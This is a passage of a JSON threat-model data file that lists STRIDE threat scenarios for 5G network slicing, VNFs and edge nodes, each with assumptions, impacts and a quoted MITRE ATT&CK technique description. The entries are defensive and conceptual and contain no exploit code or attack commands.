                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposure of VNF configurations and sensitive information through unsecured orchestration and management interfaces.",
            "Assumptions": [
                {
                    "Assumption": "Management interfaces are not secured using HTTPS",
                    "Role": "System Engineer",
                    "Condition": "HTTPS not enforced on interfaces"
                },
                {
                    "Assumption": "Default administrative credentials are not changed",
                    "Role": "Administrator",
                    "Condition": "Default credentials remain"
                },
                {
                    "Assumption": "Automated scans for open ports and interfaces are not conducted",
                    "Role": "Security Analyst",
                    "Condition": "Scans are infrequent or nonexistent"
                }
            ],
            "Potential Impact": "Leakage of sensitive operational configurations leading to potential misuse and attacks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "VNF",
                "orchestration",
                "management interfaces",
                "configuration exposure"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insufficient isolation between network slices leads to data leakage between different tenant slices.",
            "Assumptions": [
                {
                    "Assumption": "Network slice isolation policies are not enforced",
                    "Role": "Network Administrator",
                    "Condition": "Isolation policies are absent"
                },
                {
                    "Assumption": "Shared resources are used without adequate segmentation",
                    "Role": "Resource Manager",
                    "Condition": "Segmentation is not applied"
                },
                {
                    "Assumption": "No regular validation and testing of isolation mechanisms",
                    "Role": "Security Tester",
                    "Condition": "Isolation mechanisms are not tested regularly"
                }
            ],
            "Potential Impact": "Compromise of sensitive data across different slices, violating tenant privacy and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network slices",
                "isolation",
                "segmentation",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Network Boundary Bridging",
                "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
                "technique_id": "T1599"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack overwhelms edge and cloud computing nodes deploying critical services resulting in system unavailability.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting for service requests",
                    "Role": "Network Architect",
                    "Condition": "Rate limiting is not implemented"
                },
                {
                    "Assumption": "Lack of distributed attack detection mechanisms",
                    "Role": "Security Operator",
                    "Condition": "Attack detection systems are not implemented"
                },
                {
                    "Assumption": "Dependency on single points of failure in network architecture",
                    "Role": "System Planner",
                    "Condition": "Architecture not resilient"
                }
            ],
            "Potential Impact": "Complete unavailability of critical services leading to widespread service outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "edge node",
                "cloud node",
                "system unavailability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infection spreads within VNFs causing excessive resource consumption and degradation of service performance.",
            "Assumptions": [
                {
                    "Assumption": "No endpoint protection on VNF instances",
                    "Role": "Security Engineer",
                    "Condition": "Endpoint protection is not applied"
                },
                {
                    "Assumption": "Lack of real-time VNF health monitoring",
                    "Role": "System Administrator",
                    "Condition": "Health monitoring systems not active"
                },
                {
                    "Assumption": "No automated response to detected malware activity",
                    "Role": "Security Analyst",
                    "Condition": "Automated response mechanisms not in place"
                }
            ],
            "Potential Impact": "Degraded performance and potential service downtime affecting multiple network slices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "VNF",
                "resource consumption",
                "service degradation"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of known vulnerabilities in network functions causes crashing of essential VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Outdated software running on network functions",
                    "Role": "Software Maintainer",
                    "Condition": "Software is not updated"
                },
                {
                    "Assumption": "No comprehensive vulnerability management program",
                    "Role": "Security Manager",
                    "Condition": "Vulnerability scans not conducted"
                },
                {
                    "Assumption": "Patches and security updates are not applied in a timely manner",
                    "Role": "System Administrator",
                    "Condition": "Timely updates not performed"
                }
            ],
            "Potential Impact": "Crashing of VNFs causing interruptions in critical services and loss of availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerabilities",
                "exploitation",
                "VNF",
                "crashing"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains unauthorized administrative access to the orchestrator by exploiting misconfigured access control settings.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are not rigorously enforced or reviewed",
                    "Role": "Security Administrator",
                    "Condition": "Access controls are misconfigured"
                },
                {
                    "Assumption": "Weak or reused administrative credentials are used",
                    "Role": "User Manager",
                    "Condition": "Poor credential practices"
                },
                {
                    "Assumption": "No regular auditing of access permissions and roles",
                    "Role": "Compliance Officer",
                    "Condition": "Auditing is irregular"
                }
            ],
            "Potential Impact": "Full control over all network slices and VNFs, leading to potential sabotage and sensitive data exposure.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrative access",
                "orchestrator",
                "access control",
                "sabotage"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Misuse of service accounts with excessive privileges to manipulate VNF configurations and operations.",
            "Assumptions": [
                {
                    "Assumption": "Service accounts are not segregated based on least privilege principle",
                    "Role": "Account Manager",
                    "Condition": "Least privilege not enforced"
                },
                {
                    "Assumption": "No monitoring of service account activities",
                    "Role": "Security Analyst",
                    "Condition": "Activities are not audited"
                },
                {
                    "Assumption": "Service accounts share permissions with multiple critical VNFs",
                    "Role": "Security Engineer",
                    "Condition": "Permissions are not isolated"
                }
            ],
            "Potential Impact": "Potential manipulation of network operations and data misuse.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "service accounts",
                "VNF",
                "least privilege",
                "manipulation"
            ],
            "mitre_technique": {
                "name": "Account Manipulation",
                "description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
                "id": "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27",
                "technique_id": "T1098"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of software vulnerabilities in VNFs to execute arbitrary code with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "VNFs run without regular security updates",
                    "Role": "Software Maintainer",
                    "Condition": "Software is not regularly updated"
                },
                {
                    "Assumption": "Vulnerable services are exposed to untrusted networks",
                    "Role": "Network Engineer",
                    "Condition": "Service exposure is not controlled"
                },
                {
                    "Assumption": "No real-time intrusion detection system (IDS) monitoring for exploit attempts",
                    "Role": "Security Administrator",
                    "Condition": "IDS is not implemented"
                }
            ],
            "Potential Impact": "Execution of arbitrary code leading to potential takeover and misuse of affected components.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerabilities",
                "arbitrary code execution",
                "exploit"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "4",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a network function to gain access to a specific network slice.",
            "Assumptions": [
                {
                    "Assumption": "Identity verification of network functions is weak.",
                    "Role": "Attacker",
                    "Condition": "Access to network credentials or weaknesses in authentication."
                },
                {
                    "Assumption": "Network functions communicate over insecure channels.",
                    "Role": "Network Designer",
                    "Condition": "Lack of secure communication protocols."
                },
                {
                    "Assumption": "Monitoring and anomaly detection are not robust.",
                    "Role": "Network Operator",
                    "Condition": "Insufficient or bypassed security monitoring systems."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data in the network slice.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "impersonation",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker disguises their device as a legitimate edge node.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes are not uniquely identifiable.",
                    "Role": "Network Engineer",
                    "Condition": "Absence of unique identifiers or weak validation methods."
                },
                {
                    "Assumption": "There is no mutual authentication between edge nodes and the core network.",
                    "Role": "Developer",
                    "Condition": "Failure to implement SSL/TLS or other encryption methods."
                },
                {
                    "Assumption": "Physical security of edge nodes is poorly managed.",
                    "Role": "Facilities Manager",
                    "Condition": "Vulnerable physical access points."
                }
            ],
            "Potential Impact": "Corruption of data processed at the edge or unauthorized use of network resources.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "edge",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Network Devices",
                "description": "Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment -- instead leveraging these devices to support additional targeting.\n\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005)) or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659) operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised network devices.\n\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nCompromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011) activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice GRU 2024)",
                "id": "attack-pattern--149b477f-f364-4824-b1b5-aa1d56115869",
                "technique_id": "T1584.008"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and manipulates API calls between orchestration and management components.",
            "Assumptions": [
                {
                    "Assumption": "API endpoints are not adequately protected.",
                    "Role": "Developer",
                    "Condition": "Use of unencrypted protocols."
                },
                {
                    "Assumption": "API keys are stored or transmitted insecurely.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of secure key management practices."
                },
                {
                    "Assumption": "Network segmentation does not adequately isolate critical management systems.",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient network segmentation."
                }
            ],
            "Potential Impact": "Unauthorized control over network slices and their configurations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "API",
                "management",
                "orchestration"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies virtual network functions (VNFs) to access sensitive data or disrupt services.",
            "Assumptions": [
                {
                    "Assumption": "Access controls on VNFs are inadequate.",
                    "Role": "System Administrator",
                    "Condition": "Weak or misconfigured access permissions."
                },
                {
                    "Assumption": "The VNF deployment process is not secure.",
                    "Role": "DevOps Engineer",
                    "Condition": "Insufficient security checks during deployment."
                },
                {
                    "Assumption": "Firmware/software updates on VNFs are not verified.",
                    "Role": "IT Security Specialist",
                    "Condition": "Lack of digital signatures or verification mechanisms."
                }
            ],
            "Potential Impact": "Data integrity compromised and potential service disruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "modification",
                "dataintegrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data in transit between edge computing nodes and the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission channels are insecure.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of encryption or use of weak encryption methods."
                },
                {
                    "Assumption": "Edge nodes are not adequately monitored.",
                    "Role": "Security Operations",
                    "Condition": "Insufficient monitoring of edge activities."
                },
                {
                    "Assumption": "Edge-to-cloud communication is not validated.",
                    "Role": "Developer",
                    "Condition": "Absence of proper validation and verification processes."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential leakage of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data",
                "transmission",
                "injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises orchestration scripts to control the deployment of network slices.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration scripts are stored insecurely.",
                    "Role": "DevOps Engineer",
                    "Condition": "Lack of secure storage solutions for codebases."
                },
                {
                    "Assumption": "Code review processes are inadequate.",
                    "Role": "Development Manager",
                    "Condition": "Insufficient peer review or automated code review."
                },
                {
                    "Assumption": "Configuration management systems are not secure.",
                    "Role": "IT Administrator",
                    "Condition": "Misconfigured or outdated systems."
                }
            ],
            "Potential Impact": "Unauthorized deployment and configuration changes, leading to service disruption or unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "scripts",
                "orchestration",
                "deployment"
            ],
            "mitre_technique": {
                "name": "Taint Shared Content",
                "description": "\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
                "id": "attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c",
                "technique_id": "T1080"
            }
        },
        {
